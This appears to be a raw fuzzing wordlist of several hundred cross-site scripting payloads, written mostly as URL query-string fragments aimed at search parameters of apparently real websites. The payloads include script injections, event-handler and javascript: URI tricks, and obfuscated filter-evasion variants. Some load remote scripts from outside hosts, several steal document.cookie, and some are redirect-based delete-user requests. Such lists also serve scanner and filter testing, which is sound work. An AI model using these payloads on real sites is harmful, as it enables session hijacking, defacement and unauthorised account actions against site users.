&op=%3C/h3%3E%3Cscript%20type=%22text/javascript%22%3Ealert(%22Derp%22);%3C/script%3E
&opc=2"><script>alert(String.fromCharCode(88,83,83))</script>
open(name)
&o=&q=%3Cscript+type%3D%22text%2Fjavascript%22%3Ealert%28%27lol+porn+xss%27%29%3B%3C%2Fscript%3E
ºscriptæalert(¢XSS¢)º/scriptæ
&output=xml_no_dtd&client=default_frontend&proxystylesheet=default_frontend&q=Test%27-alert%28%27XSSPOSED%27%29-%27
Overlong UTF-8 (SiteMinder is awesome!)
&o=v&page=%3Cscript%20src=https://xssposed.org/1.js%3E%3C/script%3E&menu=111-222-1933bbq@bbq.bbq&site=assparade
o={x:''+<s>eva</s>+<s>l</s>,y:''+<s>aler</s>+<s>t</s>+<s>(1)</s>};function f() { 0[this.x](this.y) }f.call(o);
p
&p=2&q=wine"><script src="http://www.yourjavascript.com/38310202111/xss.js">&x=0&y=0
&p=37
&page=1&query=;!--%22%3Ciframe+src%3D'http://reddit.com/r/xss'+width%3D'1024'+height%3D'600'%3E%3C/iframe%3E
&page=%22%3E%3Cscript%3Ealert%28123%29%3C/script%3E%22
&page=%22%3E%3CScRipT%3Ealert%28/xssposed/%29%3C%2FScrIpT%3E
&pageAction=search&text=%3C/script%3E%3Cscript%3Ealert%280%29;%3C/script%3E
&page=answers&type=search&searchid=1260543686413&question_box=rddt%3Cbody%20onload=alert%28document.cookie%29%3Erddt&ichbox[]=en-US
&page=answers&type=search&searchid=%22%3Cmarquee%3E%3Cimg+src%3D%27http%3A%2F%2Fstatic.reddit.com%2Freddit.com.header.png%27%2F%3E%3C/marquee%3E
&PageFlow="><script>alert(String.fromCharCode(88,83,83))</script>
&page_function=search&keyword=x=eval%28eval%28eval%28eval%28eval%29%29%29,%20alert%28/1/%3C/xmp%3E%22%22%3E%3E%3C%3Cscript%3Ealert%28/XSSPOSED/%29%3C/script%3E%3C!--%29%29;x=eval%28x%29&x=17&y=10
&pageid=198&search=1&teams=</script>">'><script>alert(String.fromCharCode(88,83,83))</script>
&page_id=4046&portal_prefix="><script>alert('XSS')</script>
&page_id=6&td_id=200800024"><script>alert(document.cookie)</script>
&PAGE="><script>alert('XSS')</script>
&page=search&Searchset=3&SearchString=%22><script>alert%28%22XSS%22%29</script><div%20%22
&pageSection=free_home_game_search&pogoword=%27%29;alert%28/xss/.source%29;//
&page=servicefaq&geo='-location.replace('//1653309246')-'&product=ipad
&partNumber=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
&payphone=977&country=%22%3E%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C/script%3E
&pdf=NOOOO&state=ANY%20TEXT%20HERE&st=1%3Cscript%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/script%3E
perl -e 'print "<IMG SRC=java\0script:alert(\"CrossSiteScripting\")>";' > out
perl -e 'print "<IMG SRC=java\0script:alert("XSS")>";'> out
perl -e 'print "<IMG SRC=java\0script:alert("XSS")>";' > out
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
perl -e 'print \"&lt;SCR\0IPT&gt;alert(\\"XSS\\")&lt;/SCR\0IPT&gt;\";' &gt; out
perl -e 'print "<SCR\0IPT>alert(\"CrossSiteScripting\")</SCR\0IPT>";' > out
perl -e 'print "<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out
perl -e 'print "&<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out
&p=foglia_giochi_1&sezione=pub&sottosezione="><script>alert('XSS')</script>
PGlmcmFtZSBzcmM9aHR0cDovL3Rlc3QuZGU+
&phish_id=%22%3E%3Cinput%20type=submit%20value=CLICK%A0HERE%A0TO%A0TRIGGER%A0XSS!%20onClick=confirm%28navigator.userAgent%29;alert%28/XSS%A0EXAMPLE/.source%29;eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,97,115,115,105,103,110,40,34,104,116,116,112,58,47,47,110,121,97,110,46,99,97,116,34,41));BODY%20BGCOLOR=%22#111111%22%3E
&photo_num=9%22;alert('xss');//
PHP 		a = val2
&pid=11452087&cat=438&msort=rebatedesc&mnpos="><script>alert('XSS')</script>
"><p id=""onmouseover=\u0070rompt(1) //
</plaintext\></|\><plaintext/onmouseover=prompt(1)
</plaintext\></|\><plaintext/onmouseover=prompt(1)
</plaintext\></|\><plaintext/onmouseover=prompt(1)
</plaintext\></|\><plaintext/onmouseover=prompt(1)
&popup=%3C/script%3E%3Cscript%3Ealert%28/XSSPOSED/%29;%3C/script%3E
Prefix URI schemes.
&product=edpr&additional="><script>alert(String.fromCharCode(88,83,83))</script>
&&product_name="><script>alert('XSS')</script>
&productPageUrl="><script>alert(String.fromCharCode(88,83,83))</script>
&product=prints&q=%22-confirm%28/XSSPOSED/%29-%22
&proxystylesheet=DCUK&site=ukDiscovery&client=DCUK&region=uk&output=xml_no_dtd&getfields=*&filter=1&ie=utf8&oe=utf8&q=%22;+alert%28%22XSS%22%29;//&searchbtn=go
&pscNotFound=Y&actualRadius=15&ErrorMsg=';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E+';alert(String.fromCharCode(88,83,83))//\\';alert(S+LA+90210&address_selected=';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E&city_selected=';alert(String.fromCharCode(88,83,83))//\\';alert(S&facility_type=GLUCOSE+TOLERANCE&employment=&radius_selected=15&search_by_state=&state_selected=LA&zip_selected=90210&service_types=1&flow_from=patient&&call_from=hcp_psc_srch_results.jsp&browser=nonie&view_reload=Y
&p=Search%22%3E%3Cscript%3Ealert%28%22Tom%20Coburn:%20International%20A**hole%20of%20Mystery%22%29;%3C/script%3E%3Cimg%20src=%22http://img404.imageshack.us/img404/9195/coburnaustinpowers.jpg%22%20style=%22position:absolute;top:100;%22%20%3E%3Cdiv%20%20&filter=0&num=10&q=
<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
&q0=%22;alert%28%27XSS%27%29;//
&q=0\\%22autofocus%2Fonfocus%3Dalert%28%2FXSSPO+SED%2F%29--%3E%3Cvideo%2Fposter%2Fonerror%3Dprompt%28%2FXSSPOSED%2F%29%3E%22-confirm%28%2FXSSPOSED%2F%29-%22&label=Department+of+Psychology&site=psych.ubc.ca
&q=0\\"autofocus/onfocus=alert(/XSSPO+SED/)--><video/poster/onerror=prompt(/XSSPOSED/)>"-confirm(/XSSPOSED/)-"
&q=%22};%20alert(%22XSS%22);%3C/script%3E
&q=%22%20style=%22visibility:hidden%22%3E%3C/iframe%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%3Ciframe style=%22visibility:hidden%22%3E&btnG.x=0&btnG.y=0&btnG=Go&entqr=0&ud=1&sort=date:D:L:d1&output=xml_no_dtd&oe=UTF-8&ie=UTF-8&client=result_only&proxystylesheet=result_only&site=ng
&q=%22%20style=background:red;left:0;top:0;height:500px;width:500px;position%20:absolute;z-index:1000%20onmouseover=alert(/XSSPOSED/)%20%22
&q=%22%29%3B+alert%281%29%3B+%2F%2F&aff=1100
&q=%22%2balert%28%22XSS%22%29%2b%22&ref=index
&q=%22%3Cscript%3Ealert%28%22HA!%22%29;%3C/script%3E%3Cp
&q=%22%3Cscript%3E+alert%28%22XSSPOSED%22%29%3C%2Fscript%3E%3E
&q=%22%3E%27%3E%3Cscript%3Ealert%28%270%27%29;%3C/script%3E
&q=%22%3E%3CA+onmouseover%3Dalert%28%2FXSSPOSED%2F%29%3EXSS%2C+needs+to+be+fixed+ASAP%3C%2Fa%3E&type=Deseret+News&submit=Search
&q=%22%3E%3Cbody%20onload=alert%28/XSS/.source%29%3E
&q=%22%3E%3Cbody/onpageshow=%28alert%29%28/XSSPOSED/%29%3E&kw=lol&x=0&y=0
&q=%22\\%3E%3Cimg+src%3Dx+onerror%3Dalert(0)%3E
&q=%22%3E%3Cscript%3E+-+-1-+-+alert%28/XSSPOSED/%29%3C/script%3E
&q=%22%3E%3C/script%3E%3Cbody%20onload=alert(%22XSS%22)%3E
&q=%22--%3E%3C/script%3E%3Cscript%20src=%22http://ha.ckers.org/xss.js%22%20type=%22text/javascript%22%3E%3C/script%3E%3Cscript%3E\\&cc=us&lang=en
&q=%22%3E%3Cscript%3Ea=eval;b=alert;a%28b%28/XSSPOSED/.source%29%29;%3C/script%3E%3E/&l=
&q=%22%3E%3Cscript%3Ealert%28%22o%22%29%3C%2Fscript%3E
&q=%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E
&q=%22%3E%3Cscript%3E+alert%28%22XSSPOSED%22%29%3C/script%3E%3E/
&q=%22%3E%3Cscript%3Ealert%28/XSS%20by%20CyberVillian/%29;%3C/script%3E
&q=%22%3E%3Cscript/xss%3Ealert%28/XSSPOSED/%29%3C/script/xss%3E
&q=%22%3E%3Csvg%2Fonload%3Dalert%28%2FXSSPOSED%2F%29%3E%3C!-+-
&q=%22%3E%3C/title%3E%3Cscript%3E%28alert%29%28%22XSSPOSED%22%29%3C%2Fscript%3E%3E%2F&prefn1=brand&prefv1=carters
&q=%22%3Exss%3Cvideo/poster/onerror=prompt%28/XSSPOSED/%29%3E
&q=%22;alert%280%29//&proxystylesheet=sp-us&site=sp-us
&q=%22;alert%28%27XSS%27%29;//&sort=date%3AD%3AS%3Ad1&entsp=a&client=redesign_frontend&entqr=0&oe=UTF-8&ud=1&getfields=*&proxystylesheet=redesign_frontend&output=xml_no_dtd&site=default_collection&filter=p&search_submit=Search
&q=%22ri%22-alert(%22XSS%22)-%22lo%22
&q=%2522%252F%253E%253Cscript%253Ealert%2528%2522XSS%2522%2529%253C%252Fscript%253E%253Cdiv+id%253D%2522
&q=%2527%3balert%28/XSSPOSED%29//\\%2527%3balert%281%29//%2522%3balert%28/XSSPOSED/%29//\\%2522%3balert%283%29//--%253E%253C/SCRIPT%253E%2522%253E%2527%253E%253CSCRIPT%253Ealert%28/XSSPOSED/%29%253C/SCRIPT%253E=&{}%2522%29%3b}alert%286%29%3bfunction+xss%28%29{//&q=%2527%3balert%280%29//\\%2527%3balert%281%29//%2522%3balert%282%29//\\%2522%3balert%283%29//--%253E%253C/SCRIPT%253E%2522%253E%2527%253E%253CSCRIPT%253Ealert%28/XSSPOSED/%29%253C/SCRIPT%253E=&{}%2522%29%3b}alert%286%29%3bfunction+xss%28%29{//
&q=%27%22%3E%3C%2Ftitle%3E%3Cscript%3E+alert%28%22XSSPOSED%22%29%3C%2Fscript%3E%3E%2F&sort=newest&date-range=any&type=all&section=all
&q=%27;//\\%22;alert%280%29//--%3E%3C/script%3E%22%3E%27%3E%3Cscript%3Ealert%280%29%3C/script%3E
&q=%27%29;alert%28%27XSS%27%29;//
&q=%27%3Balert%28%2FXSSPOSED%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F%26q%3D%27%3Balert%280%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F
&q=%27%3Balert%28%2FXSSPOSED%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F%26q%3D%27%3Balert%280%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F&header_submit=&src=usergen&ac=
&q=%27%3Balert%28%2FXSSPOSED%29%2F%2F\\%27%3Balert%28/XSSPOSED/%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F%26q%3D%27%3Balert%280%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F
&q=%27;}--%3E%3C/script%3E%3Cscript%3Ejavascript:alert(/XSSPOSED/)%3C/script%3E
&q=%27%3E%3C/script%3E%3Cscript%3Ejavascript:alert(/XSSPOSED/)%3C/script%3E
&q=%27;alert%28/XSSPOSED%29//\\%27;alert%281%29//%22;alert%282%29//\\%22;alert%283%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28/XSSPOSED/%29%3C/SCRIPT%3E=&{}%22%29;}alert%286%29;function+xss%28%29{//&q=%27;alert%280%29//\\%27;alert%281%29//%22;alert%282%29//\\%22;alert%283%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28/XSSPOSED/%29%3C/SCRIPT%3E=&{}%22%29;}alert%286%29;function+xss%28%29{//
&q='%29;}%20alert%28/XSS/.source%29;%20function%20dub%28a%29%20{//
&q=%3Cbody%20onload=alert(%22XSS%22)%3E
&q=%3Cbody%20onload=alert%28%22XSS%22%29%3E
&q=%3Cbody+onload%3Dalert(%22XSS%22);%3E
&q=%3CBODY+ONLOAD+%3Dalert('XSS')%3E
&q=%3Cscript%2Fxss%3Ealert%28%2FXSSPOSED%2F%29%3C%2Fscript%2Fxss%3E
&q=';%3C/script%3E%3Cscript%3Ealert(0);%3C/script%3E
&q=%3C/script%3E%3Cscript%3Ejavascript:alert(/XSSPOSED/)%3C/script%3E
&q=%3Cscript%3Ealert(0);%3C/script%3E&hobSearch.x=0&hobSearch.y=0
&q=%3CSCRIPT%3Ealert(%22VOTE%20FOR%20ZACH%20ANNER!%22)%3C/script%3E
&q=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
&q=%3Cscript%3E+alert(%22XSSPOSED%22)%3C/script%3E
&q=%3Cscript%3Ealert%28%221%22%29%3C/script%3E
&q=%3Cscript%3Ealert%28%22XSS%22%29%3b%3C%2fscript%3E&p=0
&q=%3Cscript%3Ealert%28%22XSS%22%29;%3C/script%3E
&q=%3Cscript%3Ealert%28%27X-D+xss+again+%3A-%28%27%29%3C%2Fscript%3E&xsubmit=Search
&q=%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E
&q=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
&q=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E&cmd=ok&typeSearch=web&x=0&y=0
&q=%3Cscript%3Ealert('Hello%20Reddit');%3C/script%3E
&q=%3C/title%3E%3Cscript%3Ealert%280%29%3C/script%3E%3Ctitle%3E&mpb=1&SearchSourceOrigin=19
&q=%3C/title%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%3Ctitle%3E&s=Search
&q=aaaa%22%3E%3Cscript%20type=text/javascript%3Ealert%28%27XSSPOSED%27%29%3C/script%3E%3Cimg%20src=%22http://duckduckgo.com/assets/logo_homepage.normal.v101.png%22%3E%3C/img%3E
&q=a";alert('xss!!!');x="&offset=0&submit=Go
&q=');};alert(%22XSS%22);//
&q=';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E
&q=a&r=home_home&p=bigtop'style='position:fixed;left:0;top:0;width:10000px;height:10000px'onmouseover='alert(0)
&q=asd%22%3E%3Cscript+src=%22http://www.yourjavascript.com/38310202111/xss.js%22%3E&x=0&y=0
&q=as"><script src="http://www.yourjavascript.com/38310202111/xss.js">
&q=constructor0alert(document.cookie)&kl=split&kp='%0Ax=(&ks=,rq)[&kw=,kl](&ka=|0)%0A&kt=%0Ay=(&ky=,x[&kk=,0])%0A&kf=%0Az=(&kc=,x[&ke=,1])%0A&kr=%0Ay=y[&ko=,y][&kj=,y]%0A&kz=%0Ay(&kg=%2Bz)(&kh=)%0A'
&q=foobar&after=fizzbuzz
&q=fox"%29;%20alert%28"XSS"%29;//&submit=Search
&q=hi.com%27%20style%3d%27height:10000px%27%20onmouseover%3d%27alert%28%22xss%22%29
&qh=&section=&q=';alert(0)//
&q=I hope Matt can stand a joke"%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E&searchappbutton.x=0&searchappbutton.y=0&t=simple
<q/oncut=alert(1)>
&q=oreally&submit=SEARCH&DYM=oreilly&u1=%27;!--%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
&q=Psycho_Mantis%22%3E%3Csvg/onload=alert(document.domain)%3C%22
&q=Quadrocopter</span ><script>alert(/XSSPOSED/);</script>
&qry=duh&searchKey=television&skp=17_163&tgt=%27;!--%22%3E%3Cembed%20width=600%20height=500%20src=http://www.youtube.com/v/8n1hKQULa9Y%3E
&q=<script>alert('0')</script>
&q=<script>alert('0');</script>
&q=<script>alert%28"XSS"%29</script>
&q="><script>alert(String.fromCharCode(88,83,83))</script>
&q="><script>alert(String.fromCharCode(88,83,83))</script>
&q=<script>alert(/XSSPOSED/)</script>
&q="><script>alert("xss")</script>
&q="><script>alert('XSS')</script>
&q=/></script><script>alert('XSS');</script>
&qs=manutd_frontend&catTxt=All&searchText=<script>alert('XSS')</script>
<Q%^&*(£@!’” style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>
&qt=%27%3Balert%28%2FXSSPOSED%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfun
&qt=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E&published=on&active_tab=site
&q=test&max=100&adv_age=1100&server=%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E
&qt=i&rt=r&w0=%27%22%3E%3C/title%3E%3Cscript%3E%20alert%28%22XSSPOSED%22%29%3C/script%3E%3E/
&query=1%22+onmouseover=alert%28String.fromCharCode%2867,108,105,99,107,32,79,75,32,105,102,32,121,111,117,32,112,114,101,102,101,114,32,67,111,99,97,45,67,111,108,97,46%29%29+
&Query=%22%3Cmarquee%3E%3Cstrike%3E%3CIMG+SRC%3D%22http://i.imgur.com/X2rwY.jpg%22%3E%3Cscript%3Ealert%28%22smrk3r%22%29%3B%3C%2Fscript%3E%3Cp&target=article
&query=%22;//--%3E%22%3E%27%3E%3Cscript%3Ealert%28%270%27%29;%3C/script%3E
&query=%22%3E%3Cbody%2Fonpageshow%3D%28alert%29%28%2FXSSPOSED%2F%29%3E
&query=%22%3E%3Cscript%20type=%22javascript%22%3E%3C/script%3E
&query=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E
&query=%22;alert%28%27XSS%27%29;s.prop1=%22
&query=%27%22%3E%3C/script%3E%3Cmarquee/onstart=confirm%28document.domain%29%3E%3E&activeTabIndex=1&searchContext=Personal&loggedIn=false&site=shop
&query=%27%3Balert%28%2FXSSPOSED%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F%26q%3D%27%3Balert%280%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F&publication=TAL+2008&x=0&y=0
&Query=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F\\%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F\\%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E&target=article&sortby=display_time+descending
&query=%3Cscript%3Ealert(%22xss%22)%3C/script%3E&src=en&dst=en&v=1.0
&query=%3Cscript%3E+alert%28%22XSS%22%29%3B+%3C%2Fscript%3E&page=1&hitsPerPage=25&sortBy=RELEVANCY&lang=English&srchIn=ALLRESEARCH&src=&athrT=10&cmpT=10&pgT=10&_xpn=false
&query=%3Cscript%3Ealert%28%22XSS%22%29%3B%3C%2Fscript%3E&x=0&y=0
&query=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
&query=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&mode=author
&query=aal%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E&x=0&y=0
&query=bibit&start=85&search=1&results=10%22%27/%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E
&query=psychomantis&store_name=\\%27,init%29%29;}if%281==1%29{confirm%28/XSSPOSED/%29;//
&query=<script>alert('XSS')</script>
&query=Search+RMRS...%22%3E%3Cscript%3E%2B-%2B-1-%2B-%2Balert%28%2FXSSPOSED%2F%29%3C%2Fscript%3E
&query=Search-word%3Cscript%3Ealert('Sup%20reddit
&querystring='-prompt(%22XSS%22)-'&submit=+Search+&view=internal&pubName=sol&p=sun&bl=on&navigators=&offset=0&sortby=
&queryText=%22/%3E%3CscRipt%3Ealert%28%22XSS%22%29%3C/scRipt%3E
&queryText=">'><script>alert('0')</script>
&queryType=nonparsed&query="<marquee><img src="http://thumbs.reddit.com/t5_2qxe8.png
&query=xss protection&siteAlias="<img src="http://thumbs.reddit.com/t5_2qxe8.png
&query=XSS&ps=&loc=searchbox&tab=web&currProv=lygo&mode=&dfi=<script>alert%28"XSS"%29</script>
&q=wewt%3C/title%3E%3Cscript%3Ealert%28%27XSS%27%29;%3C/script%3E
&q=xss
&q=XSSPOSED%27%29;};%3C/script%3E%3Cscript%3Ealert%28%20/XSSPOSED/%29%3C/script%3E%27
r
r
&redirAuth=nauth&s_cu=javascript:alert%28/XSSPOSED/%29
Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
Redirect 302 /vlab.jpg http://vulnerability-lab.com/admin.asp&deleteuser
&redirectUri=%22%2f%3e%3c%6d%61%72%71%75%65%65%3e%6c%6f%6c%3c%2f%6d%61%72%71%75%65%65%3e
&ref=%22/%3E0\\%22autofocus/onfocus=alert%28/XSSPO%20SED/%29--%3E%3Cvideo/poster/onerror=prompt%28/XSSPOSED/%29%3E%22-confirm%28/XSSPOSED/%29-%22
&Referer=lolwat%27%29;alert%28document.cookie%29;new%20Button%28%27
&reqCode=browseBASEE&myEmsbarCode=0680127282884&mailNum="/><script>alert%28%22XSS%22%29</script><span %22&optijiaot.x=29&optijiaot.y=7&D0D14672D61192C57F6E4C7=7%23pg
&RequestedPage=%27%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E%3Cp
&res=');%3C/script%3E%3Ciframe%20width=500%20height=500%20src=//bit.ly/1628nB%3E%3C!--
res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210
&return=%22%3Cscript%3Ealert%28%22xss%22%29%3C/script%3E
&returnto=%22%3Cimg%20src=%22http://thumbs.reddit.com/t5_2qxe8.png
&rm=listresults&filter=datedesc&keywords=%3C/script%3E%3Cscript%20src=http://goonmaster.agilityhoster.com/replace.js%3E%3C/script%3E%3Cscript%3E&x=0&y=0
&rtn='+alert('XSS')+'&st=1&email=lol@lol.com
s
<s>000<s>%3cs%3e111%3c/s%3e%3c%73%3e%32%32%32%3c%2f%73%3e&#60&#115&#62&#51&#51&#51&#60&#47&#115&#62&#x3c&#x73&#x3e&#x34&#x34&#x34&#x3c&#x2f&#x73&#x3e
&s=0\\%22autofocus%2Fonfocus%3Dalert%28%2FXSSPO+SED%2F%29--%3E%3Cvideo%2Fposter%2Fonerror%3Dprompt%28%2FXSSPOSED%2F%29%3E%22-confirm%28%2FXSSPOSED%2F%29-%22
s1=0?'1':'i'; s2=0?'1':'fr'; s3=0?'1':'ame'; i1=s1+s2+s3; s1=0?'1':'jav'; s2=0?'1':'ascr'; s3=0?'1':'ipt'; s4=0?'1':':'; s5=0?'1':'ale'; s6=0?'1':'rt'; s7=0?'1':'(1)'; i2=s1+s2+s3+s4+s5+s6+s7;
s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=parentNode;x.appendChild(i);
s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=parentNode;x.appendChild(i);
s1='java'||''+'';s2='scri'||''+'';s3='pt'||''+'';
s1=['java'||''+'']; s2=['scri'||''+'']; s3=['pt'||''+''];
s1=['java'+''+''+'scr'+'ipt'+':'+'aler'+'t'+'(1)'];
s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1)'+''; u1=s1+s2+s3;URL=u1
s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1)'+'';u1=s1+s2+s3;URL=u1
s1=!''&&'jav';s2=!''&&'ascript';s3=!''&&':';s4=!''&&'aler';s5=!''&&'t';s6=!''&&'(1)';s7=s1+s2+s3+s4+s5+s6;URL=s7;
s1=<s>evalalerta(1)a</s>,s2=<s></s>+'',s3=s1+s2,e1=/s/!=/s/?s3[0]:0,e2=/s/!=/s/?s3[1]:0,e3=/s/!=/s/?s3[2]:0,e4=/s/!=/s/?s3[3]:0,e=/s/!=/s/?0[e1+e2+e3+e4]:0,a1=/s/!=/s/?s3[4]:0,a2=/s/!=/s/?s3[5]:0,a3=/s/!=/s/?s3[6]:0,a4=/s/!=/s/?s3[7]:0,a5=/s/!=/s/?s3[8]:0,a6=/s/!=/s/?s3[10]:0,a7=/s/!=/s/?s3[11]:0,a8=/s/!=/s/?s3[12]:0,a=a1+a2+a3+a4+a5+a6+a7+a8,1,e(a)
&s=%22%2F%3E%3Cscript%3Ealert%28%27xss%27%29%3B%3C%2Fscript%3E&searchtype=IT+Blogs&x=0&y=0
&s=%22%3E%3C/script%3E%3Cbody/onfocus=%28alert%29%28/XSSPOSED/%29%3E
&s=%22%3E%3Cscript%3Ealert%28%22XSS%22%29;%3C/script%3E
&s=%27%22%3E%3C%2Ftitle%3E%3Cscript%3E+alert%28%22XSSPOSED%22%29%3C%2Fscript%3E%3E%2F
&s='%29;%20alert%28'XSS
&s=%3Cscript%3Ealert(0)%3C/script%3E
&s=%3Cscript%3Ealert(%22XSS%22);%3C/script%3E
